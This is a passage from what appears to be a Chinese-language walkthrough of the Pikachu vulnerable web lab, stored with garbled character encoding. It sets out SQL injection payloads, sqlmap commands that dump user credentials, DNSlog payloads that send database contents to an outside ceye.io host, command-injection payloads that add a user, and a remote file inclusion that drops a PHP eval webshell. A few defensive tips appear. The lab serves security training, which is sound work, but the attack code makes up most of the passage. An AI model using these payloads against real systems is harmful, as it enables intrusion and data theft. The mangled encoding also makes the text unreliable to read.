çš„ç«¯å£ï¼ˆæœ¬æ¬¡è¿æ¥ï¼‰:tcp11004\n```\n\n**é€šè¿‡è¿™äº›ä¿¡æ¯æˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼Œè¿™ä¸ªåç«¯åº”è¯¥å¯¹`HTTP header`é‡Œé¢çš„æ•°æ®è¿›è¡Œäº†è·å–ï¼Œåº”è¯¥ä¹Ÿè¿›è¡Œäº†ç›¸å…³æ•°æ®åº“çš„æ“ä½œï¼ŒBurpsuiteæŠ“åŒ…è¿›è¡Œæµ‹è¯•ï¼Œæµ‹è¯•å‘ç°User-Agentã€Acceptã€Cookieå¤„å­˜åœ¨SQLæ³¨å…¥**\n\n**User-Agentæ³¨å…¥**\n\n**ä¿®æ”¹User-Agentå®ç°æ³¨å…¥ï¼Œè¿™é‡Œæˆ‘ç”¨æ³¨é‡Šç¬¦ä¸€ç›´æŠ¥é”™ï¼Œæ‰€ä»¥ç”¨`and '`è¿›è¡Œé—­åˆ**\n\n```sql\n1' and updatexml(1, concat(0x7e, database()), 1) and '\n```\n\n**![](https://img.jwt1399.top//img/20200727172454.png)**\n\n**Acceptæ³¨å…¥**\n\n**ä¿®æ”¹Acceptå®ç°æ³¨å…¥**\n\n```sql\n1' and updatexml(1, concat(0x7e, database()), 1) #\n```\n\n**![](https://img.jwt1399.top//img/20200727173340.png)**\n\n**Cookieæ³¨å…¥**\n\n**ä¿®æ”¹Cookieå®ç°æ³¨å…¥**\n\n```sql\nadmin' and updatexml(1, concat(0x7e, database()), 1) #\n```\n\n**![](https://img.jwt1399.top//img/20200727172742.png)**\n\n**è¿™é‡Œåªæ¼”ç¤ºäº†è·å–æ•°æ®åº“ï¼Œæƒ³è¦è·å–å…¶ä»–æ•°æ®åº“ä¿¡æ¯æ–¹æ³•ä¸€æ ·ï¼Œåªéœ€è¦ä¿®æ”¹æ³¨å…¥è¯­å¥å³å¯**\n\n### **ç›²æ³¨(base on bollian)**\n\n **å¸ƒå°”æ³¨å…¥åˆ©ç”¨æƒ…æ™¯**\n\n- **é¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºä½ï¼Œå¹¶ä¸”æ²¡æœ‰è¾“å‡ºSQLè¯­å¥æ‰§è¡Œé”™è¯¯ä¿¡æ¯**\n- **åªèƒ½é€šè¿‡é¡µé¢è¿”å›æ­£å¸¸ä¸ä¸æ­£å¸¸åˆ¤æ–­**\n\n**è¿™é‡Œæ˜¯å­—ç¬¦å‹ç›²æ³¨ï¼Œæˆ‘å°±ä¸è®²ç›²æ³¨åŸç†å’Œæ‰‹å·¥ç›²æ³¨äº†ï¼Œéœ€è¦äº†è§£çš„ï¼Œè¯·çœ‹æˆ‘å¦ä¸€ç¯‡æ–‡ç« ï¼š[æ·±å…¥å‰–æSQLæ³¨å…¥](https://jwt1399.top/posts/32179.html)**\n\n#### **SqlMapå®ç°å¸ƒå°”ç›²æ³¨**\n\n```sql\n--batch: ç”¨æ­¤å‚æ•°ï¼Œä¸éœ€è¦ç”¨æˆ·è¾“å…¥ï¼Œå°†ä¼šä½¿ç”¨sqlmapæç¤ºçš„é»˜è®¤å€¼ä¸€ç›´è¿è¡Œä¸‹å»ã€‚\n--threads 10 :è®¾ç½®çº¿ç¨‹ä¸º10ï¼Œè¿è¡Œé€Ÿåº¦ä¼šæ›´å¿«\n```\n\n```sql\n#æŸ¥è¯¢æ•°æ®åº“ã€pikachuã€‘ \npython sqlmap.py -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2\"  --dbs\n\n#è·å–æ•°æ®åº“ä¸­çš„è¡¨ã€httpinfo,member,message,users,xssblindã€‘ \npython sqlmap.py -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2\" -D pikachu --tables --batch --threads 10 \n\n#è·å–è¡¨ä¸­çš„å­—æ®µåã€...user,password,...ã€‘ \npython sqlmap.py -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2\"  -D pikachu -T users --columns --batch --threads 10 \n\n#è·å–å­—æ®µä¿¡æ¯\npython sqlmap.py -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2\" -D pikachu -T users -C username,password --dump --batch --threads 10\n```\n\n**![](https://img.jwt1399.top//img/20200727215251.png)**\n\n#### **DNSlogå¤–å¸¦æ•°æ®æ³¨å…¥**\n\n##### **æŸ¥è¯¢æ•°æ®åº“**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select database()),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n\n1' and if((select load_file(concat('\\\\\\\\',(select database()),'.8tiwyi.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200807095247.png)\n\n##### **æŸ¥è¯¢è¡¨**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=database() limit 3,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200807095519.png)\n\n##### **æŸ¥è¯¢åˆ—**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select column_name from information_schema.columns where table_name='users' limit 4,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200807095617.png)\n\n##### **æŸ¥è¯¢å€¼**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select concat_ws('--',username,password) from users limit 0,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200807102111.png)\n\n### **ç›²æ³¨(base on time)**\n\n**æ—¶é—´æ³¨å…¥åˆ©ç”¨æƒ…æ™¯**\n\n- **é¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºä½**\n- **æ²¡æœ‰è¾“å‡ºæŠ¥é”™è¯­å¥**\n- **æ­£ç¡®çš„sqlè¯­å¥å’Œé”™è¯¯çš„sqlè¯­å¥é¡µé¢è¿”å›ä¸€è‡´**\n\n#### **SqlMapå®ç°æ—¶é—´ç›²æ³¨**\n\n```\n--batch: ç”¨æ­¤å‚æ•°ï¼Œä¸éœ€è¦ç”¨æˆ·è¾“å…¥ï¼Œå°†ä¼šä½¿ç”¨sqlmapæç¤ºçš„é»˜è®¤å€¼ä¸€ç›´è¿è¡Œä¸‹å»ã€‚\n--technique:é€‰æ‹©æ³¨å…¥æŠ€æœ¯ï¼Œ-T:Time-based blind  ï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰\n--threads 10 :è®¾ç½®çº¿ç¨‹ä¸º10ï¼Œè¿è¡Œé€Ÿåº¦ä¼šæ›´å¿«ã€‚\n```\n\n```bash\n#æŸ¥è¯¢æ•°æ®åº“ #ã€pikachuã€‘\npython sqlmap.py -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2#\" --technique T --current-db --batch --threads 10\n\n#è·å–æ•°æ®åº“ä¸­çš„è¡¨ #ã€httpinfo,member,message,users,xssblindã€‘\npython sqlmap.py  -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2#\" --technique T -D pikachu  --tables --batch --threads 10\n\n#è·å–è¡¨ä¸­çš„å­—æ®µå #ã€...user,password,...ã€‘\npython sqlmap.py -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2#\" --technique T -D pikachu -T users --columns --batch --threads 10 \n\n#è·å–å­—æ®µä¿¡æ¯\npython sqlmap.py -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2#\" --technique T -D pikachu -T users -C username,password --dump --batch --threads 10 \n```\n#### **DNSlogå¤–å¸¦æ•°æ®æ³¨å…¥**\n\n##### **æŸ¥è¯¢æ•°æ®åº“**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select database()),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n##### **æŸ¥è¯¢è¡¨**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=database() limit 3,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n##### **æŸ¥è¯¢åˆ—**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select column_name from information_schema.columns where table_name='users' limit 4,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n##### **æŸ¥è¯¢å€¼**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select concat_ws('--',username,password) from users limit 0,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n### **å®½å­—èŠ‚æ³¨å…¥**\n\n**è¿™é‡Œæˆ‘å°±ä¸è®²åŸç†äº†ï¼Œéœ€è¦äº†è§£å®½å­—èŠ‚æ³¨å…¥åŸç†çš„ï¼Œè¯·çœ‹æˆ‘å¦ä¸€ç¯‡æ–‡ç« ï¼š[æ·±å…¥å‰–æSQLæ³¨å…¥](https://jwt1399.top/posts/32179.html)**\n\n**é€šè¿‡æµ‹è¯•ï¼Œå‘ç°è¿™æ˜¯postä¼ å‚ï¼Œæ‰€ä»¥BurpSuiteæŠ“åŒ…è¿›è¡Œæµ‹è¯•ã€‚**\n\n```sql\n#ç¡®å®šå­—æ®µæ•°\n1%df' order by 1 --+  \nè¿™é‡Œç”¨order byåˆ¤æ–­å­—æ®µæ•°é‡ä¼šæŠ¥é”™,æš‚æ—¶ä¸çŸ¥é“ä»€ä¹ˆåŸå› ã€‚\n\n#ç¡®å®šæ˜¾ç¤ºä½\n-1%df' union select 1,2 --+\n\n#æŸ¥è¯¢æ•°æ®åº“ \n-1%df' union select 1,database() --+ \n\n#æŸ¥è¯¢è¡¨å \n-1%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+ \n\n#æŸ¥è¯¢å­—æ®µå \n-1%df' union select 1, group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+ \n\nè¿™é‡Œè¡¨åtable_nameçš„å€¼å¿…é¡»è½¬æ¢æˆ16è¿›åˆ¶ï¼Œå¦‚æœä¸ç”¨16è¿›åˆ¶å°±å¾—ç”¨å¼•å·åŒ…è£¹ï¼Œå½“æœ‰addlasheså‡½æ•°å°±ä¼šè½¬ä¹‰å¼•å·ï¼Œå°±ä¼šå¯¼è‡´æŸ¥è¯¢å¤±è´¥ï¼Œä½¿ç”¨16è¿›åˆ¶é¿å…äº†è¿™ä¸ªé—®é¢˜ã€‚ \n\n#æŸ¥è¯¢å­—æ®µä¿¡æ¯ \n-1%df' union select 1,group_concat(username,0x3a,password) from users --+ \n```\n\n**![](https://img.jwt1399.top//img/20200727182636.png)**\n\n\n\n### **SQLæ³¨å…¥é˜²èŒƒ**\n\n**1.å¯¹ä¼ è¿›SQLè¯­å¥é‡Œé¢çš„å˜é‡è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å±é™©å­—ç¬¦ä¼ å…¥ï¼›**\n**2.ä½¿ç”¨å‚æ•°åŒ–ï¼ˆParameterized Query æˆ– Parameterized Statementï¼‰ï¼›**\n**3.è¿˜æœ‰å°±æ˜¯,ç›®å‰æœ‰å¾ˆå¤šORMæ¡†æ¶ä¼šè‡ªåŠ¨ä½¿ç”¨å‚æ•°åŒ–è§£å†³æ³¨å…¥é—®é¢˜,ä½†å…¶ä¹Ÿæä¾›äº†\"æ‹¼æ¥\"çš„æ–¹å¼,æ‰€ä»¥ä½¿ç”¨æ—¶éœ€è¦æ…é‡!**\n\n## **RCE**\n\n### **åŸºç¡€çŸ¥è¯†å‡†å¤‡**\n\n> **RCE(Remote Command/Code Execute)ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚**\n\n#### **å‘½ä»¤æ‹¼æ¥ç¬¦**\n\n##### **windows**\n\n1. **`â€œ|â€` ç®¡é“ç¬¦ï¼Œå‰é¢å‘½ä»¤æ ‡å‡†è¾“å‡ºï¼Œåé¢å‘½ä»¤çš„æ ‡å‡†è¾“å…¥**\n2. **`â€œ&â€` commandA & commandB å…ˆè¿è¡Œå‘½ä»¤Aç„¶åè¿è¡Œå‘½ä»¤B**\n3. **`â€œ||â€` commandA || commandB è¿è¡Œå‘½ä»¤Aï¼Œå¦‚æœå¤±è´¥åˆ™è¿è¡Œå‘½ä»¤B**\n4. **`â€œ&&â€` commandA && commandB è¿è¡Œå‘½ä»¤Aï¼Œå¦‚æœæˆåŠŸåˆ™è¿è¡Œå‘½ä»¤B**\n\n##### **linux**\n\n1. **`â€œ|â€` ç®¡é“ç¬¦ï¼Œå‰é¢å‘½ä»¤æ ‡å‡†è¾“å‡ºï¼Œåé¢å‘½ä»¤çš„æ ‡å‡†è¾“å…¥**\n2. **`â€œ&â€` commandA & commandB å…ˆè¿è¡Œå‘½ä»¤Aç„¶åè¿è¡Œå‘½ä»¤B**\n3. **`â€œ||â€` commandA || commandB è¿è¡Œå‘½ä»¤Aï¼Œå¦‚æœå¤±è´¥åˆ™è¿è¡Œå‘½ä»¤B**\n4. **`â€œ&&â€` commandA && commandB è¿è¡Œå‘½ä»¤Aï¼Œå¦‚æœæˆåŠŸåˆ™è¿è¡Œå‘½ä»¤B**\n5. **`â€œ;â€` commandA;commandBæ‰§è¡Œå®ŒAæ‰§è¡ŒB**\n6. **`â€œ%0aâ€` æ¢è¡Œç¬¦**\n7. **`â€œ%0dâ€` å›è½¦ç¬¦**\n\n#### **å‘½ä»¤æ‰§è¡Œå‡½æ•°**\n\n**åœ¨PHPä¸­ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰ï¼š**\n\n**`systemã€execã€shell_execã€passthruã€pcntl_execã€popenã€proc_popenç­‰`**\n\n### **exec \"ping\"**\n\n**æºç åˆ†æï¼š**\n\n```php\nif(isset($_POST['submit']) && $_POST['ipaddress']!=null){\n    $ip=$_POST['ipaddress'];\n    if(stristr(php_uname('s'), 'windows')){\n        $result.=shell_exec('ping '.$ip);//ç›´æ¥å°†å˜é‡æ‹¼æ¥è¿›æ¥ï¼Œæ²¡åšå¤„ç†\n    }else {\n        $result.=shell_exec('ping -c 4 '.$ip);\n    }\n}\n```\n\n**å¯ä»¥çœ‹åˆ°æ‰§è¡Œ`shell_exec()`å‡½æ•°æ—¶æ˜¯ç›´æ¥æ‹¼æ¥çš„`$ip`å˜é‡ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç›´æ¥æ‹¼æ¥æ¶æ„å‘½ä»¤è¿›è¡Œæ‰§è¡Œã€‚**\n\n**å› ä¸ºæ˜¯Windowsç¯å¢ƒï¼Œæ‰€ä»¥åªèƒ½æ‰§è¡ŒWindowsä¸‹çš„å‘½ä»¤**\n\n**Payload:**\n\n```\n127.0.0.1 | dir\n127.0.0.1 & dir\n127.0.0.1 || dir\n127.0.0.1 && dir\n127.0.0.1 & ipconfig\n127.0.0.1 | net user hack 123 /add #æ·»åŠ ç”¨æˆ·\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/zOi6W3aQoCvgPj5.png)**\n\n### **exec \"eval\"**\n\n**æºç åˆ†æï¼š**\n\n```php\nif(isset($_POST['submit']) && $_POST['txt'] != null){\n    if(@!eval($_POST['txt'])){\n        $html.=\"<p>ä½ å–œæ¬¢çš„å­—ç¬¦è¿˜æŒºå¥‡æ€ªçš„!</p>\";\n```\n\n**æäº¤å†…å®¹è¿›å…¥äº† `@!eval`ä¸­ å¦‚æœä¸æŠ¥é”™å°±æ‰§è¡Œ,æŠ¥é”™å°±ä¼šè¾“å‡ºä¸€å¥è¯**\n\n**Payload:**\n\n```\nphpinfo();\nsystem(\"dir\");\nsystem(\"ipconfig\");\nsystem(\"whoami\");\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/FeypcaCuTHD47os.png)**\n\n## **File Inclusion**\n\n### **ç®€ä»‹**\n\n> **`File Inclusion`(æ–‡ä»¶åŒ…å«æ¼æ´)ï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½ã€‚åœ¨å„ç§å¼€å‘è¯­è¨€ä¸­éƒ½æä¾›äº†å†…ç½®çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå…¶å¯ä»¥ä½¿å¼€å‘äººå‘˜åœ¨ä¸€ä¸ªä»£ç æ–‡ä»¶ä¸­ç›´æ¥åŒ…å«ï¼ˆå¼•å…¥ï¼‰å¦å¤–ä¸€ä¸ªä»£ç æ–‡ä»¶ã€‚ æ¯”å¦‚ åœ¨PHPä¸­ï¼Œæä¾›äº†ï¼š**\n> **`include(),include_once(),require(),require_once()`,è¿™äº›æ–‡ä»¶åŒ…å«å‡½æ•°åœ¨ä»£ç è®¾è®¡ä¸­è¢«ç»å¸¸ä½¿ç”¨åˆ°ã€‚**\n\n\tå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°ä¸­åŒ…å«çš„ä»£ç æ–‡ä»¶æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ä¹Ÿä¸ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚ ä½†æ˜¯ï¼Œæœ‰äº›æ—¶å€™ï¼Œæ–‡ä»¶åŒ…å«çš„ä»£ç æ–‡ä»¶è¢«å†™æˆäº†ä¸€ä¸ªå˜é‡ï¼Œä¸”è¿™ä¸ªå˜é‡å¯ä»¥ç”±å‰ç«¯ç”¨æˆ·ä¼ è¿›æ¥ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšè¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ æ”»å‡»ç€ä¼šæŒ‡å®šä¸€ä¸ªâ€œæ„æƒ³ä¸åˆ°â€çš„æ–‡ä»¶è®©åŒ…å«å‡½æ•°å»æ‰§è¡Œï¼Œä»è€Œé€ æˆæ¶æ„æ“ä½œã€‚ \n\n### **æ–‡ä»¶åŒ…å«å‡½æ•°**\n\n#### **include( )**\n\n**å½“ä½¿ç”¨è¯¥å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªæœ‰ä»£ç æ‰§è¡Œåˆ° include()å‡½æ•°æ—¶æ‰å°†æ–‡ä»¶åŒ…å«**\n**è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶ä¹‹ç»™å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚**\n\n#### **include_once( )**\n\n**åŠŸèƒ½ä¸ Include()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡**\n\n#### **require( )**\n\n**require()ä¸ include()çš„åŒºåˆ«åœ¨äºrequire()æ‰§è¡Œå¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œå‡½æ•°ä¼šè¾“å‡º**\n**é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ç»ˆæ­¢è„šæœ¬çš„è¿è¡Œã€‚**\n\n#### **require_once( )**\n\n**åŠŸèƒ½ä¸ require()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚**\n\n### **Local**\n\n> **æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼šä»…èƒ½å¤Ÿå¯¹æœåŠ¡å™¨æœ¬åœ°çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œç”±äºæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶ä¸æ˜¯æ”»å‡»è€…æ‰€èƒ½å¤Ÿæ§åˆ¶çš„ï¼Œå› æ­¤è¯¥æƒ…å†µä¸‹ï¼Œæ”»å‡»ç€æ›´å¤šçš„ä¼šåŒ…å«ä¸€äº› å›ºå®šçš„ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œä»è€Œè¯»å–ç³»ç»Ÿæ•æ„Ÿä¿¡æ¯ã€‚å¾ˆå¤šæ—¶å€™æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¼šç»“åˆä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä»è€Œå½¢æˆæ›´å¤§çš„å¨åŠ›ã€‚**\n\n**æºç åˆ†æï¼š**\n\n```php\nif(isset($_GET['submit']) && $_GET['filename']!=null){\n    $filename=$_GET['filename'];\n    include \"include/$filename\";\n}\n```\n\n**`$_GET['filename']`å‚æ•°å¼€å‘è€…æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œç›´æ¥å¸¦å…¥äº†`include`çš„å‡½æ•°ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹`filename`çš„å€¼ï¼Œæ‰§è¡Œéé¢„æœŸçš„æ“ä½œã€‚**\n\n**å®‰å…¨çš„å†™æ³•:**\n\n**ä½¿ç”¨ç™½åå•ï¼Œä¸¥æ ¼æŒ‡å®šåŒ…å«çš„æ–‡ä»¶å**\n\n```php\nif($filename=='file1.php' || $filename=='file2.php' || $filename=='file3.php' || \t\t\t$filename=='file4.php' || $filename=='file5.php'){\n         include \"include/$filename\";\n}\n```\n\n**æ‰“å¼€å¹³å°ï¼Œé€‰æ‹©ä¸€ä¸ªé€‰é¡¹,å¯ä»¥çœ‹åˆ°ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ååˆ°åå°ï¼Œåå°æ‰“å¼€åŒ…å«çš„æŒ‡å®šç›®æ ‡æ–‡ä»¶**\n\n```\nhttp://127.0.0.1/pikachu-master/vul/fileinclude/fi_local.php?filename=file1.php&submit=%E6%8F%90%E4%BA%A4\n```\n\n**Linux æˆ–Windowsï¼Œæˆ‘ä»¬éƒ½å¯ä»¥ä½¿ç”¨ `â€œ../â€` çš„æ–¹å¼è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œè¯»å–å…¶ä»–ç›®å½•ä¸‹çš„æ–‡ä»¶**\n\n**payload**\n\n```\n?filename=../../../../Windows/System32/drivers/etc/hosts       #è¯»å–æœ¬åœ°åŸŸåè§£ææ–‡ä»¶\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/aWlPwkITdbYUGJE.png)**\n\n### **Rrmote**\n\n> **è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼šèƒ½å¤Ÿé€šè¿‡urlåœ°å€å¯¹è¿œç¨‹çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„ä»£ç ï¼Œè¿™ç§æƒ…å†µæ²¡å•¥å¥½è¯´çš„ï¼Œå‡†å¤‡æŒ‚å½©ã€‚å› æ­¤ï¼Œåœ¨webåº”ç”¨ç³»ç»Ÿçš„åŠŸèƒ½è®¾è®¡ä¸Šå°½é‡ä¸è¦è®©å‰ç«¯ç”¨æˆ·ç›´æ¥ä¼ å˜é‡ç»™åŒ…å«å‡½æ•°ï¼Œå¦‚æœéè¦è¿™ä¹ˆåšï¼Œä¹Ÿä¸€å®šè¦åšä¸¥æ ¼çš„ç™½åå•ç­–ç•¥è¿›è¡Œè¿‡æ»¤ã€‚**\n\n**`æ³¨æ„ï¼š`è¿œç¨‹åŒ…å«æ¼æ´çš„å‰æï¼šå¦‚æœä½¿ç”¨çš„incldueå’Œrequireï¼Œåˆ™éœ€è¦åœ¨phpStudyæˆ–php.iniä¸­é…ç½®å¼€å¯ä¸‹é¢é€‰é¡¹**\n\n```ini\nallow_url_fopen=on //é»˜è®¤æ‰“å¼€\nallow_url_include=on //é»˜è®¤å…³é—­\n```\n\n**æºç åˆ†æï¼š**\n\n```php\nif(isset($_GET['submit']) && $_GET['filename']!=null){\n    $filename=$_GET['filename'];\n    include \"$filename\";\n}\n```\n\n**è·Ÿä¸Šé¢æœ¬åœ°ä»£ç ä¸€æ ·ï¼Œå˜é‡ä¼ è¿›æ¥ç›´æ¥åŒ…å«,æ²¡åšä»»ä½•çš„å®‰å…¨é™åˆ¶**\n\n**æ‰“å¼€å¹³å°ï¼Œé€‰æ‹©ä¸€ä¸ªé€‰é¡¹ã€‚åŒæ ·æ˜¯é€šè¿‡ä¼ é€’ä¸€ä¸ªæ–‡ä»¶åè¿›è¡ŒåŒ…å«çš„**\n\n```\nhttp://127.0.0.1/pikachu-master/vul/fileinclude/fi_remote.php?filename=include%2Ffile1.php&submit=%E6%8F%90%E4%BA%A4\n```\n\n**å› ä¸ºè¿™ä¸ªé™åˆ¶åªèƒ½è¯»å–txtæ–‡ä»¶,è¿™é‡Œtxtä¼šè¢«è§£ææˆphpæ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å†™ä¸€ä¸ª`yijuhua.txt`æ–‡ä»¶æ‰§è¡Œè¿‡åè®©ä»–è‡ªå·±ç”Ÿæˆæœ¨é©¬**\n\n```php\n<?php\n$myfile = fopen(\"yijuhua.php\", \"w\");\n$txt = '<?php @eval($_POST['x']);?>';\nfwrite($myfile, $txt);\nfclose($myfile);\n?>\n```\n\n**payload:**\n\n```\n?filename=http://127.0.0.1/pikachu-master/test/yijuhua.txt\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/p5ETxhGDOWcMXeN.png)**\n\n**è¿è¡Œä¹‹åæœç„¶äº§ç”Ÿäº†ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶**\n\n**ç”¨èšå‰‘è¿›è¡Œè¿æ¥**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/7MJ6t2aYUDkb9Bz.png)**\n\n**è¿æ¥æˆåŠŸ**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2eIfGw4lEKFzMq1.png)**\n\n## **unsafe filedownload**\n\n>**æ­¤æ—¶å¦‚æœ æ”»å‡»è€…æäº¤çš„ä¸æ˜¯ä¸€ä¸ªç¨‹åºé¢„æœŸçš„çš„æ–‡ä»¶åï¼Œè€Œæ˜¯ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è·¯å¾„(æ¯”å¦‚../../../etc/passwd),åˆ™å¾ˆæœ‰å¯èƒ½ä¼šç›´æ¥å°†è¯¥æŒ‡å®šçš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚ ä»è€Œå¯¼è‡´åå°æ•æ„Ÿä¿¡æ¯(å¯†ç æ–‡ä»¶ã€æºä»£ç ç­‰)è¢«ä¸‹è½½ã€‚**\n\n**æç¤ºè¯´ç‚¹å‡»çƒå‘˜åå­—å³å¯ä¸‹è½½å¤´åƒå›¾ç‰‡**\n\n**ç‚¹å‡»ç§‘æ¯”çš„ä¼šç›´æ¥ä¸‹è½½ï¼Œå³é”®ç‚¹å‡»ï¼Œé€‰æ‹©å¤åˆ¶é“¾æ¥ï¼Œå¾—åˆ°å¦‚ä¸‹é“¾æ¥**\n\n```Payload\nhttp://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=kb.png\n```\n\n**å¯ä»¥çœ‹åˆ°æ˜¯ç›´æ¥é€šè¿‡filenameè¿›è¡Œè¯»å–æ–‡ä»¶çš„ï¼Œé‚£æˆ‘ä»¬æ¥å°è¯•ä¸‹è½½åœ¨ä¸Šä¸€é¡µé¢URLä¸­å‘ç°çš„`down_nba.php`**\n\n```Payload\nhttp://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=../down_nba.php\n```\n\n**æœç„¶æˆåŠŸä¸‹è½½ï¼Œå½“ç„¶è¿˜å¯ä»¥é€šè¿‡`../../`æ¥æ„é€ ä¸‹è½½å…¶ä»–æ–‡ä»¶**\n\n**é˜²èŒƒæªæ–½ï¼š**ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€\n\n**1.å¯¹ä¼ å…¥çš„æ–‡ä»¶åè¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å’Œé™å®š**\n\n**2.å¯¹æ–‡ä»¶ä¸‹è½½çš„ç›®å½•è¿›è¡Œä¸¥æ ¼çš„é™å®š**\n\n##  **unsafe upfileupload**\n\n> **æ–‡ä»¶ä¸Šä¼ 